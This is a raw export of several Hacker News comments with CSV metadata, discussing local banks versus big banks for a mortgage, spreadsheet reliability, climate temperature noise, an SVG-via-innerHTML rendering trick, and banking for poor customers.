It may be that the introductory material isn&#x27;t the best for most users, but, you know, even when <i>books</i> were the main source of tutorial material, you couldn&#x27;t always rely on whatever book was merchandised in the most prominent position with a title that seemed to be on point for what you are looking for, you comparison shopped, looked through several, and figured out which one spoke to you. I&#x27;m not going to develop &quot;hate&quot; because the digital equivalent of the most-prominently-merchandised title isn&#x27;t necessarily the best for all people.

6423518,comment,6422793,6423218,14,0,peckrob,,,"We bought a house last year in what was a moderately complex transaction. What we were trying to do was purchase a &quot;new&quot; home (it was actually 2 years old, but had been the model home in a neighborhood so it hadn&#x27;t actually been lived in) and, at the same time, build a detached garage on the property. While this seems simple, actually doing this in a way that doesn&#x27;t involve multiple loans is surprisingly complex.<p>In the end, it would be a low-risk, vanilla, 30 year conventional mortgage, and we had enough cash for a 20% down payment. It just required some complexity to set up.<p>Not surprisingly, most major banks wouldn&#x27;t even try to help us once we explained what we were trying to do. It didn&#x27;t fit any &quot;profile&quot; they had and the &quot;system&quot; was unable to let them continue. We lost count of the number of times we were told that a &quot;system&quot; prevented them from doing something.<p>So we went to a local bank - only one location, right in the middle of town. We sat down with an older guy who&#x27;s probably been making loans in this town his entire life. The president of the bank came over and talked to us, and congratulated us on our coming addition to the family (my wife was 7 months&#x27; along at the time, so very clearly pregnant).<p>After talking with us for an hour or so, before having even filled out any paperwork or pulled any credit, they were confident they could help us. They were even more happy once credit had been pulled, and offered us rates lower than any of the big banks were offering at the time. What we ended up doing was writing a 4-month construction loan for the purchase price of the house plus the cost of constructing the garage. A few months later, when the garage was completed, we closed the loan and had a single mortgage for the whole property.<p>So after that experience, I&#x27;ve started recommending my friends and family stay away from big banks and work with local banks and credit unions. Big banks may be great for the convenience factor of having branches everywhere, but they fail hard when it comes time to do anything remotely out of the ordinary.",1379782105

A one-off ticketing app is a classic example of software that would normally get developed either in a spreadsheet <i>or</i> as some custom app that a team would build for the occasion. Such custom apps are typically bad at data validation and error handling, so it&#x27;s plausible that the same typo would have had the same effect outside of Excel.<p>When I read that Eusprig literature on spreadsheet errors a few years ago, it seemed to me of rather low quality. Certainly many spreadsheets contain errors, but what are we comparing this to? Software in general contains errors. Custom app software—the only alternative to spreadsheets in most cases—tends to be of poor quality and is very expensive compared to spreadsheets. So it&#x27;s far from clear that spreadsheets are a bad tradeoff.<p>Programmers take it for granted that &quot;proper&quot; software is better than spreadsheets, but I think that is mostly bias. Intellectually and technically, spreadsheets are low-status. Among users, on the other hand, they&#x27;re high-status, for very good and deep reasons.<p>I&#x27;m also biased.

You should take the time to go and look at the actual temperature data to get a feel for how noisy it is[1]. Short term cycles like ENSO -- that we currently have no real ability to predict -- have a far greater impact on surface temperatures over those time scales[2]. It just so happens that the last 15 years or so have seen a dominance of la Niña years (which correlate with cooler surface temperatures) for reasons we don&#x27;t really understand; it could just be random or possibly ENSO could have been affected by climate change.<p>There has been no &quot;pause&quot; at all in other measurements: 2012 was the lowest recorded extent and volume of arctic sea ice and the trend is clear: <a href=""http://psc.apl.washington.edu/wordpress/wp-content/uploads/schweiger/ice_volume/BPIOMASIceVolumeAnomalyCurrentV2.png"" rel=""nofollow"">http://psc.apl.washington.edu/wordpress/wp-content/uploads/s...</a><p>Ocean heat has continued to rise: <a href=""http://www.nodc.noaa.gov/OC5/3M_HEAT_CONTENT/"" rel=""nofollow"">http://www.nodc.noaa.gov/OC5/3M_HEAT_CONTENT/</a><p>The only people talking about a &quot;pause&quot; are conservative pundits and climate change deniers.

What are you supposed to do when you need both? Good luck to you my friend</i><p>We solved this problem for our domain by using SVG but bypassing the SVG DOM. Instead of making API calls to build up vector elements, we string together a gigantic blob of SVG markup as text and then splat it into the DOM in one go using innerHTML. This works surprisingly well—it&#x27;s amazing how much computation you can cram in there without noticing any lag. We rebuild pretty much the entire UI on every mouse move and scroll.<p>At the time we came up with this trick, there was one big drawback: you couldn&#x27;t put SVG elements inside HTML elements unless your doctype was XHTML. I believe that has changed with HTML5, but haven&#x27;t ported that code yet. Can anyone add info here?<p>I have no idea how close this comes to Web/OpenGL; probably not very close, but it was a way out of the dilemma for us.<p>Edit: It used to puzzle me why this was so fast, but it seems obvious now. JS engines have optimized string concatentation, and the rendering of all that markup is happening on the C++ side, so both things that have to happen here are relatively quick. What&#x27;s slow is the trip across the Grand Canyon from JS to the rendering engine, and this technique only does that once. Essentially, you&#x27;re batching up all your API calls, and that saves you so much that the fact that you&#x27;re using a horrifically inefficient text protocol to do it doesn&#x27;t matter.",1379779719

These assumptions map fairly well to the middle class but sometimes don&#x27;t travel well.  Here&#x27;s four things I could tell you about an adult member of the middle class: they&#x27;re literate, have a primary address which changes relatively infrequently, carry identification with them, and do not fear speaking to Authority because they&#x27;re not cognizant of a reason why that should result in their immediate arrest.<p>3)  &quot;Free checking&quot; was a multi-billion dollar ongoing wealth transfer from poor bank customers to banks and relatively wealthier bank customers.  (&quot;Free checking&quot; was a marketing tactic very popular in the 90s and early 2000s where banks eliminated monthly fees for checking accounts while slashing minimum balances to open them.  The flipside is that they then started cranking up fees generated by e.g. overdrafts.  This combination generally tends to not be to the benefit of (many) poor people.)<p>4)  The alternative financial sector has a product mix which more closely matches poor people&#x27;s needs than traditional banks.  For example, short-term loans for small amounts of money available with minimal documentation required are a) astoundingly high risk, b) relatively expensive to process,  c) have fairly low margins, and d) carry explosive reputational risk.  These counsel against the typical retail bank even trying to offer them.  Much better to loan a middle class American $8k out of a credit card limit of $20k at 12% with a 3% loss rate then to loan a poor person $100 with $110 due a week later.  (If you APR-ize that it becomes &quot;A number which one never, ever wants to get asked about when you&#x27;re called to testify before Congress about how you&#x27;re causing poverty in the community you serve.&quot;)  Business thus flows to the alternative financial sector.<p>5)  (The literature is a bit circumspect about this one, but it&#x27;s there.)  Sometimes poor people make decisions which, if you appreciated their limited options, individualized viewpoints of the world, and the sociocultural context and structural issues at play... are still very effing bad decisions.",1379779302
